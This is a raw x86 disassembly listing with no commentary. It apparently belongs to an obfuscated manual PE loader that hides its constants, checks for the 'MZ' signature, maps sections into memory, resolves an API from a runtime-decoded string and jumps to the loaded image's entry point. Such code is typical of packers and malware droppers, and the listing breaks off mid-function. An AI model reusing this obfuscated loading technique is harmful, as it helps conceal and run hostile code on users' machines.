  418474:	jne    0x41847e
  418476:	mov    esi,DWORD PTR [ebp-0x20]
  418479:	mov    edi,DWORD PTR [ebp-0x24]
  41847c:	add    DWORD PTR [esi],edi
  41847e:	add    ebx,0x2
  418481:	dec    DWORD PTR [ebp-0x18]
  418484:	jne    0x418425
  418486:	mov    ebx,DWORD PTR [ebp-0xc]
  418489:	add    DWORD PTR [ebp-0x8],ebx
  41848c:	mov    esi,DWORD PTR [ebp-0x1c]
  41848f:	mov    edi,DWORD PTR [ebp-0x8]
  418492:	mov    ebx,DWORD PTR [ebp+0xc]
  418495:	xor    esi,ecx
  418497:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41849e:	jae    0x4184b8
  4184a0:	add    eax,DWORD PTR [ebp-0xc]
  4184a3:	mov    esi,DWORD PTR [ebp-0x4]
  4184a6:	mov    ebx,DWORD PTR [eax+0x4]
  4184a9:	xor    esi,ecx
  4184ab:	add    esi,edx
  4184ad:	mov    DWORD PTR [ebp-0xc],ebx
  4184b0:	cmp    ebx,esi
  4184b2:	jne    0x41840c
  4184b8:	pop    ebx
  4184b9:	mov    eax,DWORD PTR [ebp-0x28]
  4184bc:	pop    edi
  4184bd:	jmp    0x4184c2
  4184bf:	mov    eax,DWORD PTR [ebp-0x4]
  4184c2:	xor    eax,ecx
  4184c4:	add    eax,edx
  4184c6:	pop    esi
  4184c7:	leave  
  4184c8:	ret    0x8
  4184cb:	push   ebp
  4184cc:	mov    ebp,esp
  4184ce:	sub    esp,0xcc
  4184d4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  4184db:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  4184e2:	mov    eax,DWORD PTR [ebp-0x4]
  4184e5:	push   ebx
  4184e6:	push   esi
  4184e7:	mov    esi,0x751089b
  4184ec:	xor    eax,esi
  4184ee:	push   edi
  4184ef:	mov    edi,0x3272e2
  4184f4:	add    eax,edi
  4184f6:	mov    DWORD PTR [ebp-0x1c],eax
  4184f9:	mov    eax,DWORD PTR [ebp-0x4]
  4184fc:	xor    eax,esi
  4184fe:	add    eax,edi
  418500:	mov    DWORD PTR [ebp-0x8],eax
  418503:	mov    ebx,DWORD PTR [ebp+0x20]
  418506:	mov    eax,DWORD PTR [ebp-0x14]
  418509:	mov    ecx,DWORD PTR [ebp-0x14]
  41850c:	xor    eax,ecx
  41850e:	mov    DWORD PTR [ebp-0x14],eax
  418511:	add    DWORD PTR [ebp-0x14],0xf89cb585
  418518:	mov    eax,DWORD PTR [ebp-0xc]
  41851b:	mov    ecx,DWORD PTR [ebp-0xc]
  41851e:	xor    eax,ecx
  418520:	mov    DWORD PTR [ebp-0xc],eax
  418523:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41852a:	mov    eax,DWORD PTR [ebp-0x10]
  41852d:	mov    ecx,DWORD PTR [ebp-0x10]
  418530:	xor    eax,ecx
  418532:	mov    DWORD PTR [ebp-0x10],eax
  418535:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41853c:	mov    eax,DWORD PTR [ebp-0x20]
  41853f:	mov    ecx,DWORD PTR [ebp-0x20]
  418542:	xor    eax,ecx
  418544:	mov    DWORD PTR [ebp-0x20],eax
  418547:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41854e:	mov    eax,0x9471
  418553:	mov    WORD PTR [ebp+0x20],ax
  418557:	mov    eax,DWORD PTR [ebp+0x8]
  41855a:	test   eax,eax
  41855c:	je     0x4189b7
  418562:	mov    eax,DWORD PTR [ebp+0xc]
  418565:	test   eax,eax
  418567:	je     0x4189b7
  41856d:	mov    eax,DWORD PTR [ebp+0x18]
  418570:	test   eax,eax
  418572:	je     0x4189b7
  418578:	mov    ax,WORD PTR [ebp+0x20]
  41857c:	mov    ecx,0x8a8d
  418581:	xor    ax,cx
  418584:	mov    ecx,0x3b51
  418589:	add    ax,cx
  41858c:	mov    ecx,DWORD PTR [ebp+0x8]
  41858f:	cmp    WORD PTR [ecx],ax
  418592:	jne    0x4189b7
  418598:	mov    eax,DWORD PTR [ebp-0x4]
  41859b:	xor    eax,esi
  41859d:	add    eax,edi
  41859f:	mov    DWORD PTR [ebp-0x30],eax
  4185a2:	mov    eax,DWORD PTR [ebp-0x4]
  4185a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4185a8:	mov    eax,DWORD PTR [ebp+0x8]
  4185ab:	add    eax,DWORD PTR [ecx+0x3c]
  4185ae:	mov    DWORD PTR [ebp+0xc],eax
  4185b1:	mov    eax,DWORD PTR [eax+0x50]
  4185b4:	test   eax,eax
  4185b6:	je     0x4189b7
  4185bc:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  4185c3:	mov    eax,DWORD PTR [ebp-0x2c]
  4185c6:	xor    eax,esi
  4185c8:	add    eax,edi
  4185ca:	mov    DWORD PTR [ebp-0x2c],eax
  4185cd:	mov    eax,DWORD PTR [ebp-0x4]
  4185d0:	mov    eax,DWORD PTR [ebx+0x190]
  4185d6:	mov    ecx,DWORD PTR [eax]
  4185d8:	mov    ecx,DWORD PTR [ecx+0x3c]
  4185db:	add    ecx,DWORD PTR [eax]
  4185dd:	mov    eax,DWORD PTR [ebp-0x4]
  4185e0:	mov    eax,DWORD PTR [ebx+0x18c]
  4185e6:	mov    edx,DWORD PTR [eax]
  4185e8:	mov    DWORD PTR [ebp-0x18],ecx
  4185eb:	mov    DWORD PTR [ebp+0x20],edx
  4185ee:	cmp    edx,edx
  4185f0:	jne    0x418624
  4185f2:	mov    eax,DWORD PTR [ebx+0x1d8]
  4185f8:	lea    edx,[ebp-0x1c]
  4185fb:	push   edx
  4185fc:	mov    edx,DWORD PTR [ebp-0xc]
  4185ff:	xor    edx,esi
  418601:	add    edx,edi
  418603:	push   edx
  418604:	push   DWORD PTR [ecx+0x50]
  418607:	push   DWORD PTR [ebp+0x20]
  41860a:	call   DWORD PTR [eax+0x1c]
  41860d:	mov    eax,DWORD PTR [ebp-0x18]
  418610:	mov    ecx,DWORD PTR [eax+0x54]
  418613:	mov    eax,DWORD PTR [eax+0x50]
  418616:	sub    eax,ecx
  418618:	add    ecx,DWORD PTR [ebp+0x20]
  41861b:	push   ecx
  41861c:	call   0x418fa3
  418621:	mov    edx,DWORD PTR [ebp+0x20]
  418624:	mov    eax,DWORD PTR [ebx+0x194]
  41862a:	mov    DWORD PTR [eax],edx
  41862c:	mov    eax,DWORD PTR [ebp+0xc]
  41862f:	push   DWORD PTR [eax+0x54]
  418632:	push   DWORD PTR [ebp+0x8]
  418635:	push   edx
  418636:	call   0x418e4a
  41863b:	mov    ecx,DWORD PTR [ebp+0x20]
  41863e:	mov    eax,DWORD PTR [ecx+0x3c]
  418641:	add    eax,ecx
  418643:	movzx  ecx,WORD PTR [eax+0x14]
  418647:	lea    ecx,[ecx+eax*1+0x18]
  41864b:	mov    DWORD PTR [ebp+0x18],ecx
  41864e:	mov    ecx,DWORD PTR [ebp-0x4]
  418651:	movzx  edx,WORD PTR [eax+0x6]
  418655:	xor    ecx,esi
  418657:	add    ecx,edi
  418659:	mov    DWORD PTR [ebp+0xc],eax
  41865c:	cmp    edx,ecx
  41865e:	je     0x41870b
  418664:	mov    ecx,DWORD PTR [ebp-0x4]
  418667:	xor    ecx,esi
  418669:	add    ecx,edi
  41866b:	mov    DWORD PTR [ebp-0x8],ecx
  41866e:	mov    ecx,DWORD PTR [ebp-0x24]
  418671:	movzx  edx,WORD PTR [eax+0x6]
  418675:	xor    ecx,esi
  418677:	sub    edx,ecx
  418679:	sub    edx,edi
  41867b:	cmp    DWORD PTR [ebp-0x8],edx
  41867e:	ja     0x41870b
  418684:	mov    edx,DWORD PTR [ebp+0x18]
  418687:	add    edx,0x8
  41868a:	mov    DWORD PTR [ebp+0x18],edx
  41868d:	jmp    0x418692
  41868f:	mov    edx,DWORD PTR [ebp+0x18]
  418692:	mov    eax,DWORD PTR [eax+0x38]
  418695:	lea    ecx,[eax-0x1]
  418698:	mov    DWORD PTR [ebp-0x34],eax
  41869b:	mov    eax,DWORD PTR [edx]
  41869d:	test   ecx,eax
  41869f:	je     0x4186a8
  4186a1:	not    ecx
  4186a3:	and    eax,ecx
  4186a5:	add    eax,DWORD PTR [ebp-0x34]
  4186a8:	mov    ecx,DWORD PTR [edx+0x4]
  4186ab:	add    ecx,DWORD PTR [ebp+0x20]
  4186ae:	push   ecx
  4186af:	call   0x418fa3
  4186b4:	mov    edx,DWORD PTR [ebp-0x4]
  4186b7:	mov    eax,DWORD PTR [ebp+0x18]
  4186ba:	mov    ecx,DWORD PTR [eax+0x8]
  4186bd:	xor    edx,esi
  4186bf:	add    edx,edi
  4186c1:	cmp    ecx,edx
  4186c3:	je     0x4186dc
  4186c5:	push   ecx
  4186c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4186c9:	add    ecx,DWORD PTR [eax+0xc]
  4186cc:	mov    eax,DWORD PTR [eax+0x4]
  4186cf:	add    eax,DWORD PTR [ebp+0x20]
  4186d2:	push   ecx
  4186d3:	push   eax
  4186d4:	call   0x418e4a
  4186d9:	mov    eax,DWORD PTR [ebp+0x18]
  4186dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4186df:	mov    edx,DWORD PTR [ebp-0x8]
  4186e2:	add    eax,0x28
  4186e5:	xor    ecx,esi
  4186e7:	lea    ecx,[edx+ecx*1+0x3272e2]
  4186ee:	mov    edx,DWORD PTR [ebp+0xc]
  4186f1:	mov    DWORD PTR [ebp+0x18],eax
  4186f4:	mov    eax,DWORD PTR [ebp-0x24]
  4186f7:	movzx  edx,WORD PTR [edx+0x6]
  4186fb:	xor    eax,esi
  4186fd:	sub    edx,eax
  4186ff:	mov    eax,DWORD PTR [ebp+0xc]
  418702:	sub    edx,edi
  418704:	mov    DWORD PTR [ebp-0x8],ecx
  418707:	cmp    ecx,edx
  418709:	jbe    0x41868f
  41870b:	mov    edx,DWORD PTR [ebx+0x18c]
  418711:	mov    ecx,DWORD PTR [ebp+0x20]
  418714:	cmp    ecx,DWORD PTR [edx]
  418716:	jne    0x41873f
  418718:	mov    eax,DWORD PTR [ebx+0x1d8]
  41871e:	lea    edx,[ebp-0x1c]
  418721:	push   edx
  418722:	mov    edx,DWORD PTR [ebp-0x10]
  418725:	xor    edx,esi
  418727:	add    edx,edi
  418729:	push   edx
  41872a:	mov    edx,DWORD PTR [ebp-0x18]
  41872d:	push   DWORD PTR [edx+0x54]
  418730:	push   ecx
  418731:	call   DWORD PTR [eax+0x1c]
  418734:	test   eax,eax
  418736:	je     0x4189a8
  41873c:	mov    eax,DWORD PTR [ebp+0xc]
  41873f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  418745:	mov    ecx,DWORD PTR [ecx]
  418747:	xor    ecx,esi
  418749:	add    ecx,edi
  41874b:	je     0x4188d3
  418751:	and    DWORD PTR [ebp-0x28],0x0
  418755:	and    DWORD PTR [ebp+0x8],0x0
  418759:	mov    eax,0xf89c8519
  41875e:	lea    ecx,[eax-0x8]
  418761:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  418768:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41876f:	mov    DWORD PTR [ebp-0x44],eax
  418772:	mov    DWORD PTR [ebp-0x40],ecx
  418775:	mov    DWORD PTR [ebp-0x3c],ecx
  418778:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41877f:	mov    edx,DWORD PTR [ebp+0x8]
  418782:	mov    ecx,0x89b
  418787:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41878c:	mov    edx,0x72e2
  418791:	add    cx,dx
  418794:	mov    edx,DWORD PTR [ebp+0x8]
  418797:	inc    DWORD PTR [ebp+0x8]
  41879a:	cmp    DWORD PTR [ebp+0x8],0x6
  41879e:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  4187a6:	jb     0x41877f
  4187a8:	mov    ecx,0xf89c850b
  4187ad:	mov    DWORD PTR [ebp-0xa4],eax
  4187b3:	mov    DWORD PTR [ebp-0x90],eax
  4187b9:	mov    DWORD PTR [ebp-0x68],eax
  4187bc:	mov    DWORD PTR [ebp-0x64],eax
  4187bf:	lea    eax,[ecx-0x1]
  4187c2:	mov    edx,0xf89c85ff
  4187c7:	mov    DWORD PTR [ebp-0x58],eax
  4187ca:	mov    DWORD PTR [ebp-0x54],eax
  4187cd:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  4187d7:	mov    DWORD PTR [ebp-0xa0],ecx
  4187dd:	mov    DWORD PTR [ebp-0x9c],edx
  4187e3:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  4187ed:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  4187f7:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  418801:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41880b:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  418815:	mov    DWORD PTR [ebp-0x80],ecx
  418818:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41881f:	mov    DWORD PTR [ebp-0x78],edx
  418822:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  418829:	mov    DWORD PTR [ebp-0x70],ecx
  41882c:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  418833:	mov    DWORD PTR [ebp-0x60],ecx
  418836:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41883d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  418844:	xor    eax,eax
  418846:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41884d:	xor    cl,0x9b
  418850:	sub    cl,0x1e
  418853:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41885a:	inc    eax
  41885b:	cmp    eax,0x17
  41885e:	jb     0x418846
  418860:	mov    eax,DWORD PTR [ebx+0x1d8]
  418866:	lea    ecx,[ebp-0xb4]
  41886c:	push   ecx
  41886d:	call   DWORD PTR [eax+0x4]
  418870:	mov    ecx,DWORD PTR [ebx+0x1d8]
  418876:	lea    edx,[ebp-0xcc]
  41887c:	push   edx
  41887d:	push   eax
  41887e:	call   DWORD PTR [ecx+0x8]
  418881:	lea    ecx,[ebp-0x28]
  418884:	push   ecx
  418885:	mov    ecx,DWORD PTR [ebx+0x18c]
  41888b:	push   DWORD PTR [ecx]
  41888d:	call   eax
  41888f:	mov    eax,DWORD PTR [ebp-0x28]
  418892:	test   eax,eax
  418894:	je     0x4188d0
  418896:	mov    DWORD PTR [ebp+0x8],eax
  418899:	jmp    0x4188a5
  41889b:	mov    eax,DWORD PTR [eax]
  41889d:	mov    DWORD PTR [ebp-0x28],eax
  4188a0:	cmp    eax,DWORD PTR [ebp+0x8]
  4188a3:	je     0x4188b2
  4188a5:	mov    edx,DWORD PTR [eax+0x18]
  4188a8:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188ae:	cmp    edx,DWORD PTR [ecx]
  4188b0:	jne    0x41889b
  4188b2:	mov    edx,DWORD PTR [eax+0x18]
  4188b5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188bb:	cmp    edx,DWORD PTR [ecx]
  4188bd:	jne    0x4188d0
  4188bf:	mov    edx,DWORD PTR [ebp-0x18]
  4188c2:	mov    ecx,DWORD PTR [ebx+0x190]
  4188c8:	mov    edx,DWORD PTR [edx+0x28]
  4188cb:	add    edx,DWORD PTR [ecx]
  4188cd:	mov    DWORD PTR [eax+0x1c],edx
  4188d0:	mov    eax,DWORD PTR [ebp+0xc]
  4188d3:	push   ebx
  4188d4:	push   eax
  4188d5:	push   DWORD PTR [ebp+0x20]
  4188d8:	call   0x418082
  4188dd:	test   eax,eax
  4188df:	je     0x4189a8
  4188e5:	push   DWORD PTR [ebp+0xc]
  4188e8:	mov    ecx,ebx
  4188ea:	push   DWORD PTR [ebp+0x20]
  4188ed:	call   0x417fdb
  4188f2:	test   eax,eax
  4188f4:	je     0x4189a8
  4188fa:	mov    eax,DWORD PTR [ebp+0xc]
  4188fd:	mov    edx,DWORD PTR [ebp+0x20]
  418900:	mov    ecx,ebx
  418902:	call   0x417eb4
  418907:	test   eax,eax
  418909:	je     0x4189a8
  41890f:	push   ebx
  418910:	push   DWORD PTR [ebp+0x20]
  418913:	call   0x418365
  418918:	test   eax,eax
  41891a:	je     0x4189a8
  418920:	mov    eax,DWORD PTR [ebx+0x18c]
  418926:	mov    edx,DWORD PTR [ebp+0x20]
  418929:	cmp    edx,DWORD PTR [eax]
  41892b:	jne    0x418947
  41892d:	mov    eax,DWORD PTR [ebx+0x1d8]
  418933:	lea    ecx,[ebp-0x1c]
  418936:	push   ecx
  418937:	push   DWORD PTR [ebp-0x1c]
  41893a:	mov    ecx,DWORD PTR [ebp-0x18]
  41893d:	push   DWORD PTR [ecx+0x54]
  418940:	push   edx
  418941:	call   DWORD PTR [eax+0x1c]
  418944:	mov    edx,DWORD PTR [ebp+0x20]
  418947:	mov    eax,DWORD PTR [ebx+0x1c8]
  41894d:	mov    eax,DWORD PTR [eax]
  41894f:	xor    eax,esi
  418951:	add    eax,edi
  418953:	je     0x41898c
  418955:	mov    ecx,DWORD PTR [ebp+0xc]
  418958:	mov    eax,DWORD PTR [ecx+0x28]
  41895b:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  418962:	mov    esi,DWORD PTR [ebp+0x8]
  418965:	push   DWORD PTR [ebp+0x14]
  418968:	xor    esi,0x89b
  41896e:	push   DWORD PTR [ebp+0x10]
  418971:	add    esi,0x72e2
  418977:	or     WORD PTR [ecx+0x16],si
  41897b:	add    eax,edx
  41897d:	push   edx
  41897e:	call   eax
  418980:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41898a:	jmp    0x418996
  41898c:	mov    eax,DWORD PTR [ebp+0xc]
  41898f:	mov    eax,DWORD PTR [eax+0x28]
  418992:	add    eax,edx
  418994:	call   eax
  418996:	mov    DWORD PTR [ebp-0x8],eax
  418999:	mov    eax,DWORD PTR [ebp-0x8]
  41899c:	mov    ecx,DWORD PTR [ebp+0x1c]
  41899f:	mov    DWORD PTR [ecx],eax
  4189a1:	mov    DWORD PTR [ebp-0x30],0x1
  4189a8:	cmp    DWORD PTR [ebp-0x30],0x0
  4189ac:	jne    0x4189b2
  4189ae:	and    DWORD PTR [ebp+0x20],0x0
  4189b2:	mov    eax,DWORD PTR [ebp+0x20]
  4189b5:	jmp    0x4189b9
  4189b7:	xor    eax,eax
  4189b9:	pop    edi
  4189ba:	pop    esi
  4189bb:	pop    ebx
  4189bc:	leave  
  4189bd:	ret    0x1c
  4189c0:	push   ebp
  4189c1:	mov    ebp,esp
  4189c3:	movzx  edx,WORD PTR [ecx+0x6]
  4189c7:	movzx  eax,WORD PTR [ecx+0x14]
  4189cb:	push   ebx
  4189cc:	push   edi
  4189cd:	xor    edi,edi
  4189cf:	lea    eax,[eax+ecx*1+0x18]
  4189d3:	test   edx,edx
  4189d5:	je     0x4189f6
  4189d7:	mov    ecx,DWORD PTR [eax+0xc]
  4189da:	lea    ebx,[ecx+esi*1]
  4189dd:	cmp    DWORD PTR [ebp+0x8],ebx
  4189e0:	jb     0x4189ee
  4189e2:	mov    ebx,DWORD PTR [eax+0x8]
  4189e5:	add    ebx,ecx
  4189e7:	add    ebx,esi
  4189e9:	cmp    DWORD PTR [ebp+0x8],ebx
  4189ec:	jb     0x4189f8
  4189ee:	add    eax,0x28
  4189f1:	inc    edi
  4189f2:	cmp    edi,edx
  4189f4:	jb     0x4189d7
  4189f6:	xor    eax,eax
  4189f8:	pop    edi
  4189f9:	pop    ebx
  4189fa:	pop    ebp
  4189fb:	ret    0x4
  4189fe:	push   ebp
  4189ff:	mov    ebp,esp
  418a01:	sub    esp,0x34
  418a04:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  418a0b:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418a12:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  418a19:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  418a20:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  418a27:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  418a2e:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  418a35:	mov    DWORD PTR [ebp-0x10],eax
  418a38:	mov    eax,DWORD PTR [ebp+0x8]
  418a3b:	mov    DWORD PTR [ebp-0x14],eax
  418a3e:	mov    eax,DWORD PTR [ebp-0xc]
  418a41:	push   ebx
  418a42:	mov    ecx,0x751089b
  418a47:	xor    eax,ecx
  418a49:	push   esi
  418a4a:	mov    esi,DWORD PTR [ebp-0x10]
  418a4d:	mov    edx,0x3272e2
  418a52:	add    eax,edx
  418a54:	push   edi
  418a55:	cmp    esi,eax
  418a57:	je     0x418c36
  418a5d:	mov    eax,DWORD PTR [ebp-0xc]
  418a60:	mov    esi,DWORD PTR [ebp-0x14]
  418a63:	xor    eax,ecx
  418a65:	add    eax,edx
  418a67:	cmp    esi,eax
  418a69:	je     0x418c36
  418a6f:	mov    eax,DWORD PTR [ebp-0xc]
  418a72:	xor    eax,ecx
  418a74:	add    eax,edx
  418a76:	mov    DWORD PTR [ebp-0x24],eax
  418a79:	mov    eax,DWORD PTR [ebp-0xc]
  418a7c:	xor    eax,ecx
  418a7e:	add    eax,edx
  418a80:	mov    DWORD PTR [ebp-0x28],eax
  418a83:	mov    edi,DWORD PTR [ebp-0x20]
  418a86:	mov    ebx,DWORD PTR [ebp-0x8]
  418a89:	mov    esi,0x89b
  418a8e:	xor    edi,esi
  418a90:	mov    eax,0x72e2
  418a95:	xor    ebx,esi
  418a97:	add    edi,eax
  418a99:	add    ebx,eax
  418a9b:	sub    ebx,edi
  418a9d:	mov    WORD PTR [ebp-0x8],bx
  418aa1:	jmp    0x418b66
  418aa6:	mov    edi,DWORD PTR [ebp-0xc]
  418aa9:	mov    bx,WORD PTR [ebp-0x4]
  418aad:	xor    edi,esi
  418aaf:	add    edi,eax
  418ab1:	cmp    bx,di
  418ab4:	je     0x418ba8
  418aba:	mov    edi,DWORD PTR [ebp-0xc]
  418abd:	mov    ebx,DWORD PTR [ebp+0xc]
  418ac0:	xor    edi,ecx
  418ac2:	add    edi,edx
  418ac4:	cmp    ebx,edi
  418ac6:	mov    di,WORD PTR [ebp-0x4]
  418aca:	mov    bx,WORD PTR [ebp+0x8]
  418ace:	je     0x418b39
  418ad0:	cmp    bx,di
  418ad3:	je     0x418b42
  418ad5:	mov    edi,DWORD PTR [ebp-0x20]
  418ad8:	mov    bx,WORD PTR [ebp+0x8]
  418adc:	xor    edi,esi
  418ade:	add    edi,eax
  418ae0:	cmp    bx,di
  418ae3:	jb     0x418b03
  418ae5:	mov    edi,DWORD PTR [ebp-0x2c]
  418ae8:	mov    bx,WORD PTR [ebp+0x8]
  418aec:	xor    edi,esi
  418aee:	add    edi,eax
  418af0:	cmp    bx,di
  418af3:	ja     0x418b03
  418af5:	movzx  edi,WORD PTR [ebp+0x8]
  418af9:	movzx  ebx,WORD PTR [ebp-0x8]
  418afd:	add    edi,ebx
  418aff:	mov    WORD PTR [ebp+0x8],di
  418b03:	mov    edi,DWORD PTR [ebp-0x20]
  418b06:	mov    bx,WORD PTR [ebp-0x4]
  418b0a:	xor    edi,esi
  418b0c:	add    edi,eax
  418b0e:	cmp    bx,di
  418b11:	jb     0x418b31
  418b13:	mov    edi,DWORD PTR [ebp-0x2c]
  418b16:	mov    bx,WORD PTR [ebp-0x4]
  418b1a:	xor    edi,esi
  418b1c:	add    edi,eax
  418b1e:	cmp    bx,di
  418b21:	ja     0x418b31
  418b23:	movzx  edi,WORD PTR [ebp-0x4]
  418b27:	movzx  ebx,WORD PTR [ebp-0x8]
  418b2b:	add    edi,ebx
  418b2d:	mov    WORD PTR [ebp-0x4],di
  418b31:	mov    di,WORD PTR [ebp-0x4]
  418b35:	mov    bx,WORD PTR [ebp+0x8]
  418b39:	cmp    bx,di
  418b3c:	jne    0x418c36
  418b42:	mov    edi,DWORD PTR [ebp-0x1c]
  418b45:	mov    ebx,DWORD PTR [ebp-0x10]
  418b48:	xor    edi,ecx
  418b4a:	lea    edi,[edi+ebx*1+0x3272e2]
  418b51:	mov    DWORD PTR [ebp-0x10],edi
  418b54:	mov    edi,DWORD PTR [ebp-0x1c]
  418b57:	mov    ebx,DWORD PTR [ebp-0x14]
  418b5a:	xor    edi,ecx
  418b5c:	lea    edi,[edi+ebx*1+0x3272e2]
  418b63:	mov    DWORD PTR [ebp-0x14],edi
  418b66:	mov    edi,DWORD PTR [ebp-0x24]
  418b69:	mov    ebx,DWORD PTR [ebp-0x10]
  418b6c:	mov    di,WORD PTR [ebx+edi*2]
  418b70:	mov    WORD PTR [ebp+0x8],di
  418b74:	mov    edi,DWORD PTR [ebp-0x28]
  418b77:	mov    ebx,DWORD PTR [ebp-0x14]
  418b7a:	mov    di,WORD PTR [ebx+edi*2]
  418b7e:	mov    WORD PTR [ebp-0x4],di
  418b82:	mov    edi,DWORD PTR [ebp-0xc]
  418b85:	mov    bx,WORD PTR [ebp+0x8]
  418b89:	xor    edi,esi
  418b8b:	add    edi,eax
  418b8d:	cmp    bx,di
  418b90:	jne    0x418aa6
  418b96:	mov    eax,DWORD PTR [ebp-0x18]
  418b99:	mov    esi,DWORD PTR [ebp-0xc]
  418b9c:	xor    eax,ecx
  418b9e:	add    eax,edx
  418ba0:	imul   eax,esi
  418ba3:	mov    DWORD PTR [ebp-0xc],eax
  418ba6:	jmp    0x418bba
  418ba8:	mov    eax,DWORD PTR [ebp-0xc]
  418bab:	mov    esi,DWORD PTR [ebp-0x18]
  418bae:	xor    eax,ecx
  418bb0:	lea    eax,[eax+esi*1+0x3272e2]
  418bb7:	mov    DWORD PTR [ebp-0x18],eax
  418bba:	mov    eax,DWORD PTR [ebp-0x24]
  418bbd:	sub    eax,edx
  418bbf:	xor    eax,ecx
  418bc1:	mov    DWORD PTR [ebp-0x30],eax
  418bc4:	mov    eax,DWORD PTR [ebp-0x28]
  418bc7:	sub    eax,edx
  418bc9:	xor    eax,ecx
  418bcb:	mov    DWORD PTR [ebp-0x34],eax
  418bce:	mov    eax,DWORD PTR [ebp-0x34]
  418bd1:	mov    esi,DWORD PTR [ebp-0x1c]
  418bd4:	xor    esi,ecx
  418bd6:	add    esi,edx
  418bd8:	xor    eax,ecx
  418bda:	add    eax,0x3272e2
  418bdf:	imul   esi,eax
  418be2:	mov    eax,DWORD PTR [ebp-0x14]
  418be5:	movzx  eax,WORD PTR [esi+eax*1]
  418be9:	mov    esi,DWORD PTR [ebp-0x30]
  418bec:	mov    edi,DWORD PTR [ebp-0x1c]
  418bef:	xor    esi,ecx
  418bf1:	add    esi,edx
  418bf3:	xor    edi,ecx
  418bf5:	add    edi,edx
  418bf7:	imul   edi,esi
  418bfa:	mov    esi,DWORD PTR [ebp-0x10]
  418bfd:	movzx  esi,WORD PTR [edi+esi*1]
  418c01:	sub    eax,edx
  418c03:	sub    esi,edx
  418c05:	xor    eax,ecx
  418c07:	xor    esi,ecx
  418c09:	cmp    esi,eax
  418c0b:	jne    0x418c36
  418c0d:	mov    eax,DWORD PTR [ebp-0x30]
  418c10:	mov    esi,DWORD PTR [ebp-0x1c]
  418c13:	xor    eax,ecx
  418c15:	add    eax,0x3272e2
  418c1a:	xor    esi,ecx
  418c1c:	add    esi,edx
  418c1e:	imul   esi,eax
  418c21:	mov    eax,DWORD PTR [ebp-0x10]
  418c24:	movzx  eax,WORD PTR [esi+eax*1]
  418c28:	mov    esi,DWORD PTR [ebp-0xc]
  418c2b:	sub    eax,edx
  418c2d:	xor    eax,ecx
  418c2f:	cmp    eax,esi
  418c31:	mov    eax,DWORD PTR [ebp-0xc]
  418c34:	je     0x418c39
  418c36:	mov    eax,DWORD PTR [ebp-0x18]
  418c39:	pop    edi
  418c3a:	xor    eax,ecx
  418c3c:	pop    esi
  418c3d:	add    eax,edx
  418c3f:	pop    ebx
  418c40:	leave  
  418c41:	ret    0x8
  418c44:	push   ebp
  418c45:	mov    ebp,esp
  418c47:	push   ecx
  418c48:	mov    cx,WORD PTR [eax]
  418c4b:	push   esi
  418c4c:	mov    esi,0x3b51
  418c51:	sub    cx,si
  418c54:	mov    esi,0x8a8d
  418c59:	xor    cx,si
  418c5c:	mov    esi,0x4e22
  418c61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418c68:	mov    edx,0xf89c8585
  418c6d:	cmp    cx,si
  418c70:	je     0x418ccf
  418c72:	push   ebx
  418c73:	push   edi
  418c74:	movzx  ecx,cx
  418c77:	mov    edi,0xffcd8d1e
  418c7c:	mov    esi,0x751089b
  418c81:	mov    ebx,0x4f86
  418c86:	cmp    cx,bx
  418c89:	jne    0x418c8e
  418c8b:	mov    DWORD PTR [ebp-0x4],edx
  418c8e:	lea    edx,[edi+0x1]
  418c91:	xor    edx,esi
  418c93:	mov    edi,edx
  418c95:	xor    edi,esi
  418c97:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  418c9f:	mov    ebx,0x3b51
  418ca4:	sub    cx,bx
  418ca7:	mov    ebx,0x8a8d
  418cac:	xor    cx,bx
  418caf:	mov    ebx,0x4e22
  418cb4:	cmp    cx,bx
  418cb7:	jne    0x418c81
  418cb9:	mov    ecx,DWORD PTR [ebp-0x4]
  418cbc:	pop    edi
  418cbd:	pop    ebx
  418cbe:	cmp    ecx,0xf89c8586
  418cc4:	je     0x418ccf
  418cc6:	xor    ecx,esi
  418cc8:	lea    eax,[eax+ecx*2+0x64e5c6]
  418ccf:	pop    esi
  418cd0:	leave  
  418cd1:	ret    
  418cd2:	push   ebp
  418cd3:	mov    ebp,esp
  418cd5:	push   ecx
  418cd6:	push   esi
  418cd7:	push   edi
  418cd8:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418cdf:	mov    esi,0xf89c8585
  418ce4:	call   0x418c44
  418ce9:	mov    edi,eax
